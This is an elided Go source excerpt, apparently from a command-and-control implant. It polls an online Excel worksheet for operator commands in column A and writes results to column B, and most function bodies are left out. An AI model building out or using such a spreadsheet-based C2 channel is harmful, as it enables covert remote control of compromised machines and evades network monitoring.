...
func (c *ExcelClient) GenerateNewSheetName() string {
...
func (c *ExcelClient) AddSheet(name string) {
	...
	if !c.DoesWorksheetExist(name) {
		...
		if err != nil {
			common.AllC2Configs.Debug.LogFatalDebugError("Cell change error ", err)
		}
	}

}

func (c *ExcelClient) UpdateRange(cells string, values_string [][]string) (*CellRange, error) {
...
func (c *ExcelClient) GetRangeValues(cells string) (*CellRange, error) {
...
func (c *ExcelClient) GetWorksheets() (*WorkSheets, error) {
...
func (c *ExcelClient) DoesWorksheetExist(ws_name string) bool {
...
func (c *ExcelClient) GetCommandsFromSheet(ws_name string) (int, []Command, error) {
	var tick = 0
...
func (c *ExcelClient) updateFileMeta() {
	req, err := c.newRequest("GET", "/", nil)
	if err != nil {
		log.Fatal(err)
	}
...
func (c *ExcelClient) convertCellsToCommands(cells CellRange, cmds []Command) []Command {
	...
	for i, value := range cells.Values {
		...
		if i != 0 {
			...
			if value[1].(string) == "" {
				common.AllC2Configs.Debug.LogDebug("Found command - " + fmt.Sprintf("value: %v", value))
				cmd := new(Command)
				cmd.InputCol = "A"
				cmd.OutputCol = "B"
				cmd.Row = i
...
func (c *ExcelClient) ConvertExcelCoordinates(cell string) (int, int, error) {
